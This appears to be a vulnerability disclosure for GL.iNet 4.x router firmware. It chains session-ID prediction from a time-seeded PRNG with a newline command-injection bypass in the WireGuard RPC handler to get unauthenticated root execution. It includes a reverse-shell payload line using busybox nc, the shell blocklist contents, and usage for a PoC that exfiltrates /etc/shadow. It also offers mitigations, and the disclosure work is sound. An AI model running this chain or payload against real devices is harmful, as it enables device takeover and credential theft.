# GL.iNet 4.x: pre-auth root RCE via session prediction and WireGuard RPC command injection

While reverse engineering the GL.iNet 4.x web stack (firmware 4.5.22 for the GL-A1300 / Slate Plus, OpenWrt 21.02.2 base), I found two bugs that chain into unauthenticated root code execution over the management web interface. Both are in GL.iNet's custom layer on top of OpenWrt, so this probably affects more of the 4.x fleet than just the A1300. Firmware 4.5.22 on the A1300 is the only build I verified, so that's what this write-up sticks to.

## TL;DR

The login service seeds Lua's `math.random` with `os.time()` once at boot and uses it to generate session tokens. The unauthenticated `challenge` RPC method hands out chunks of that PRNG stream as login nonces, which lets you recover the seed offline and predict the administrator's next session ID. Session IDs can be tested with a second unauthenticated endpoint that has no rate limit.

Once you have an admin session, the WireGuard server RPC handler pastes a user-controlled JSON string straight into `popen("echo %s | wg pubkey")`. The only protection is a shell metacharacter blocklist in `libgl-utils.so` that blocks `` ` `` `|` `>` `;` `<` `$` `&` `(` `)` but forgot the newline. So `"A\n<cmd>"` runs `<cmd>` as a second shell line, as root.

No credentials are needed at any point. The only requirement is that an administrator logs in normally at some point while you are predicting.

```
[no creds] POST /rpc "challenge"  -> 32-char nonce = 32 consecutive math.random draws
[offline]  brute-force boot-time second against musl's LCG -> full PRNG state recovered
[no creds] POST /rpc "alive"      -> unlimited, lockout-free session-ID validity oracle
[victim]   admin logs in          -> their sid is the next 32 draws -> predicted
[attacker] "wg-server" "set_config", private_key = "A\n<cmd>" -> root popen
```

## Background: how the web stack works

GL.iNet replaced LuCI with their own stack. nginx (+ Lua) serves `/rpc`, which is a JSON-RPC front end. Simple handlers live in Lua, heavier ones in `.so` plugins that a tiny CGI dispatcher (`glc`) loads with `dlopen` at runtime. Sessions are handled by a separate daemon, `gl-ngx-session`, a Lua script running on GL's `eco` runtime, which owns every login, nonce and session ID over ubus. That daemon is where the first bug lives.

## Bug 1: the session PRNG is seeded with wall-clock time (CWE-340)

From `/usr/sbin/gl-ngx-session`:

```lua
local function init()
    ...
    math.randomseed(os.time())
end

local function generate_id(n)
    local t = { "0", "1", ... "Z" }   -- 62 symbols
    local s = {}
    for _ = 1, n do
        s[#s + 1] = t[math.random(#t)]
    end
    return table.concat(s)
end
```

Every login nonce and every session ID is a `generate_id(32)`, which is 32 consecutive `math.random(62)` draws. On this musl-based build, Lua's `math.random` is just libc's LCG:

```c
seed = seed * 6364136223846793005ULL + 1;   // srand(s): seed = s - 1
return seed >> 33;
```

`os.time()` has second resolution, so the entire token stream, sids included, is determined by one value: the second the router booted. That is not much of a secret.

### The oracle

Two RPC methods make recovering and using this very easy:

- **`challenge`** (unauthenticated), called with `{"username":"root"}`, returns a fresh nonce, which is the next 32 draws of the stream. Each request hands you 32 PRNG outputs.
- **`alive`** (unauthenticated) calls `gl-session touch` with a candidate sid and tells you whether a session exists. No rate limit, no lockout, and it does not advance the PRNG. A free validity oracle.

### Recovery

Grab two nonces, then brute-force the boot second offline: for each candidate seed, run the LCG forward, apply Lua's `math.random(62)` mapping (there are two known 5.3 implementations, the float-scaled one and the modulo one, plus a "discard first draw" quirk in `math.randomseed`; the PoC tries all combinations), and compare. A 90-day window is millions of candidates and takes seconds in Go.

### Prediction

With the seed confirmed, the emulator is locked onto the live stream, positioned right after the last nonce you pulled. When the admin logs in, their login consumes one 32-draw block (their challenge nonce) and the next block is their session ID. You sweep a few candidate blocks against `alive` and wait. On a home router nothing else draws from this PRNG, so block 1 usually hits as soon as the admin opens the login page.

At that point you have a legitimate admin session without ever seeing a password.

## Bug 2: newline bypasses the "RCE risk" filter in wg-server RPC (CWE-78)

`wg-server.so` exports `set_config()`, reached as `POST /rpc` with `["<sid>","wg-server","set_config", {...}]`. Among other things it converts the server's private key:

```c
sprintf(buf, "echo %s | wg pubkey", json_string_value(private_key));
getShellCommandReturn(buf, out);   // popen(buf, "r"), /bin/sh, and fcgiwrap runs as root
```

The input passes through two filters:

1. The Lua argument validator (`/usr/share/gl-validator.d/wg-server.lua`). `set_config.private_key` is validated with the pattern `.+`, which accepts anything non-empty.
2. `str_check_shell_injecting()` in `libgl-utils.so`, a character blocklist:

```c
// rejects:  ` | > ; < $ & ( )
// everything else passes, including 0x0A
```

No newline check. JSON decodes `\n` into a real newline, the validator's `.+` happily accepts it, the blocklist does not know it exists, and `sprintf` keeps it intact:

```
echo A
busybox nc 10.0.0.2 4444 -e /bin/sh | wg pubkey
```

`sh -c` executes both lines. The second one runs as root, because the CGI worker (`fcgiwrap`) is started by procd with no user drop, and `/etc/config/wireguard_server` ships in the factory image, so the handler's early-exit checks pass on a stock device.

Two footnotes that make this filter worse than it looks:

- `skip_field()`, the companion function in `libgl-utils.so`, exempts any argument key containing `name` or `pass` from the blocklist scan entirely.
- The same `is_rce_risk()` / `popen()` pattern guards `wg-client.so`, `ovpn-client.so` and `ovpn-server.so`, so the bypass is not specific to the WireGuard server handler. One caveat: the `sprintf` target here is a 128-byte stack buffer, so the payload budget is roughly 108 characters (there is a stack canary, longer overflows crash instead of executing).

## Chaining

`alive` confirms a predicted sid, then it is used as the `call` parameter for `set_config` with the newline payload, and the injected line runs as root. The full chain needs no credentials and no interaction from the victim beyond logging into their own router normally.

A working end-to-end PoC is in [`glinet-a1300-poc.go`](glinet-a1300-poc.go):

```
go build glinet-a1300-poc.go
./poc -host 192.168.8.1 -lhost <attacker-ip> -stage full
```

It samples the nonce oracle, cracks the seed, polls the sid oracle until an admin logs in, then fires the payload (default: exfil `/etc/shadow` back to the built-in listener). There is also `-stage exploit -sid <sid>` if you already have a session.

## Impact

- CVE-1 (waiting for assignment) (session prediction): full admin takeover, no credentials. `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`, 9.8
- CVE-2 (waiting for assignment) (command injection): root RCE with an authenticated session. `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`, 7.2
- Chained: unauthenticated root RCE, conditional only on an admin login occurring during the prediction window.

The management interface listens on LAN by default; WAN exposure applies when remote administration is enabled.

## Mitigation / what the fix should look like

- Seed `gl-ngx-session` from a CSPRNG (`/dev/urandom`, the firmware even ships `urngd`), or at minimum mix in high-resolution entropy instead of plain `os.time()`.
- Replace the metacharacter blocklist with `posix_spawn`/`execve` argv arrays for the `wg pubkey` derivation. It is a pure function call, there is no reason to involve a shell at all. Minimally, add `0x0A`/`0x0D` to the blocklist and fix `skip_field`.
- Rate-limit `alive`, and do not return a validity signal for arbitrary sids.

## Notes

- Verified only on GL-A1300 4.5.22 (OpenWrt 21.02.2 r16495, kernel 5.4.179). `gl-ngx-session`, `libgl-utils.so` and `wg-server.so` ship across the 4.x line, so other models and builds are likely affected. I have not tested them and will not claim versions I did not run.
